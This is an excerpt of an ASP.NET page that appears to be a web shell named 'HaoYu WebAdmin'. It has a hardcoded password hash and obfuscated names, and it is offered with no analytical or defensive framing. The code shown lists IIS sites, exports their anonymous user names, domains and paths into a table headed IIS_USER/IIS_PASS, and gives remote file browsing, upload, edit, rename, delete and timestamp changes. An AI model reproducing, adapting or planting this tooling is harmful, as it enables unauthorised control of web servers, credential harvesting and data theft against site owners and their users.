<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"  ContentType="text/html" ResponseEncoding="utf-8"%>
...
<script runat="server">
 public string Password = "24f4acfa6191f89d66081d2f7fae055d";
public string vbhLn="HaoYu WebAdmin";
public int TdgGU=1;
...
protected void Bin_Export(object sender, EventArgs e)
{
    ...
    try
    {
        ...
        foreach (DirectoryEntry child in mydir.Children)
        {
            if (CheckIsNumber(child.Name.ToString()))
            {
                ...
                if (sender == BinExportAll)
                {
                    table.Append("<tr>");
                    table.Append("<td>" + newdir1.Properties["AnonymousUserName"].Value + "</td>");
                    ...
                    table.Append("<td>" + weburl + "</td>");

                    table.Append("<td>" + newdir1.Properties["Path"].Value + "</td>");
                    table.Append("</tr>");
                }
                else
                {
                    ...
                    if (pc.Count > 0)
                    {
                        for (int j = 0; j < pc.Count; j++)
                        {
                            if (pc[j].ToString().ToLower().IndexOf("www") > -1)
                            {
                                weburl = pc[j].ToString();
                                break;
                            }
                        }
                        if (weburl == "")
                        {
                            weburl = pc[0].ToString();
                        }
                        Text.Append(weburl + "|--|--|--|--|--|");
                        Text.Append(newdir1.Properties["Path"].Value + "\r\n");
                    }
                }
            }
        }
    ...
    if (sender == BinExportAll)
    {	
        string TextName = "IISUSERALL.xls";
        Response.Clear();
        Response.Buffer = true;
        Response.Charset = "GB2312";
        Response.AppendHeader("Content-Disposition", "attachment;filename=" + TextName);
...
ZGKh.Text="<a href=\"javascript:if(confirm('确定要删除此文件(夹) ?')){Bin_PostBack('kRXgt','"+MVVJ(AXSbb.Value+Bin_folder.Name)+"')};\">Del</a> | <a href='#' onclick=\"var filename=prompt('请输入文件夹名称:','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_folder.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('dAJTD"+MVVJ(AXSbb.Value+Bin_folder.Name)+"',filename);} \">Rename</a>";
tr.Cells.Add(ZGKh);
UGzP.Rows.Add(tr);
}
...
GLpi.Text="<a href=\"#\" onclick=\"Bin_PostBack('ksGR','"+MVVJ(AXSbb.Value+Bin_Files.Name)+"')\">Down</a> | <a href='#' onclick=\"var filename=prompt('请输入新的文件名:','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('Bin_CFile"+MVVJ(AXSbb.Value+Bin_Files.Name)+"',filename);} \">Copy</a> | <a href=\"#\" onclick=\"Bin_PostBack('Bin_Editfile','"+Bin_Files.Name+"')\">Edit</a> | <a href='#' onclick=\"var filename=prompt('请输入新的文件名:','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('Tlvz"+MVVJ(AXSbb.Value+Bin_Files.Name)+"',filename);} \">Rename</a> | <a href=\"#\" onclick=\"Bin_PostBack('cYAl','"+Bin_Files.Name+"')\">Time</a> ";
...
try
{
    Request.Files["Fhq"].SaveAs(FlwA + Path.GetFileName(Fhq.Value));
...
<tr class="head">
<td ><span style="float:right;">QQ:975423258</span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
</tr>
<tr class="alt1">
...
<asp:TableRow CssClass="head"><asp:TableCell>ID</asp:TableCell><asp:TableCell>IIS_USER</asp:TableCell><asp:TableCell>IIS_PASS</asp:TableCell><asp:TableCell>Domain</asp:TableCell><asp:TableCell>Path</asp:TableCell></asp:TableRow>
    ...
    <asp:LinkButton ID="BinExportAll" OnClick="Bin_Export" runat="server"  Text="ExportAll"></asp:LinkButton>&nbsp;&nbsp;<asp:LinkButton ID="BinExport" OnClick="Bin_Export" runat="server"  Text="Export"></asp:LinkButton>
</div>
<%--Process--%>
...
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#e6f0ff;">Web HaoYu</div></div>
</form>
</body>
</html>
